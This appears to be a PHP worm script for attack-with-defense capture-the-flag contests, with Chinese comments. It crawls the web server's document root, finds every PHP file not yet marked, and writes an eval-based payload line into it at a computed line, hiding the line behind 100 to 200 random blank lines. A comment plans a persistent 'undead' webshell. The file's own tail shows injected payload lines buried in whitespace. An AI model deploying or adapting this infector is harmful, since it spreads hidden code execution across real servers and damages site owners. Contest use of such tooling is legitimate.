<?php
// 感染的检查头,准备加上检查这个页面和计算比对指定行之间的md5
// $tips = 'AWD_wolf_Check';
// 感染页面的代码开始步数
// 插入逻辑是 先原页面行数是不是大于step_line,如果大于且stepline 不是空行,$worm_step_line 就自己翻倍,再去判断
//  ,直到符合条件,在写入
$worm_step_line = '172';

// 代码开始行的md5值,用于自我校验
$worm_core_code = '?><?=eval("echo \'worm\';")?>';
$worm_md5 = md5($worm_core_code);
class AWDWorm
{
    private static  $instance;
    // 扫到的文件
    protected $SCAN_FILE_ARR = array();
    protected $SCAN_DIR_ARR = array();
    protected $worm_core_code;
    private function __construct()
    {
        global $worm_core_code;
        array_push($this->SCAN_DIR_ARR, $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : "/var/www/html/");
        $this->worm_core_code = $worm_core_code;
    }
    public static function getInstance()
    {
        if (!(self::$instance instanceof self)) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    public function scanDir()
    {
        while ($this->SCAN_DIR_ARR) {
            $dir = array_shift($this->SCAN_DIR_ARR);
            $this->doScanDir($dir);
        }
    }
    public function doScanDir($dir)
    {
        $dirs = scandir($dir);
        foreach ($dirs as $file) {
            if ($file === '.' || $file === '..') {
                continue;
            }
            $file = $dir . '/' . $file;
            if (is_dir($file)) {
                array_push($this->SCAN_DIR_ARR, $file);
            } else  if (pathinfo($file, PATHINFO_EXTENSION) === 'php' && !$this->isIected($file)) {
                $this->infectFile($file);
            }
        }
    }
    public function isIected($file)
    {
        global $worm_step_line, $worm_md5;
        $origin_code_content = file_get_contents($file);
        $origin_code_content_lineArr = explode("\n", $origin_code_content);
        while (count($origin_code_content_lineArr) > $worm_step_line && md5($origin_code_content_lineArr[$worm_step_line - 1]) !== $worm_md5) {
            $worm_step_line += $worm_step_line;
        }

        if (count($origin_code_content_lineArr) >= $worm_step_line && md5($origin_code_content_lineArr[$worm_step_line - 1]) === $worm_md5) {
            return true;
        }
        return false;
    }
    public function infectFile($file)
    {
        // do nothing
        var_dump($file);
        global $worm_step_line;
        $origin_code_content = file_get_contents($file);
        $origin_code_content_lineArr = explode("\n", $origin_code_content);
        while (count($origin_code_content_lineArr) >= $worm_step_line && $origin_code_content_lineArr[$worm_step_line] != '') {
            $worm_step_line += $worm_step_line;
        }
        if (count($origin_code_content_lineArr) < $worm_step_line) {

            $additon_lines =  $worm_step_line - count($origin_code_content_lineArr);
            $infect_code_content = $origin_code_content;
            for ($i = 0; $i < $additon_lines; $i++) $infect_code_content .= "\n";
            $infect_code_content .= $this->worm_core_code;
            $end_space_lines_num = mt_rand(100, 200);
            for ($i = 0; $i < $end_space_lines_num; $i++) $infect_code_content .= "\n";
        } else {
            $origin_code_content_lineArr[$worm_step_line] = $this->worm_core_code;
            $infect_code_content = implode("\n", $origin_code_content_lineArr);
        }
        $this->write_file_with_undead($file, $infect_code_content);
    }
    public function write_file_with_undead($file, $content)
    {
        // to-do 新开一个进程 加入 不死马功能
        file_put_contents($file, $content);
    }
}

AWDWorm::getInstance()->scanDir();

?><?= eval("echo 'worm';") ?>
?><?= eval("echo 'worm';") ?>
?><?= eval("echo 'worm';") ?>
?><?= eval("echo 'worm';") ?>
































































?><?= eval("echo 'worm';") ?>


?><?=eval("echo 'worm';")?>




































































































































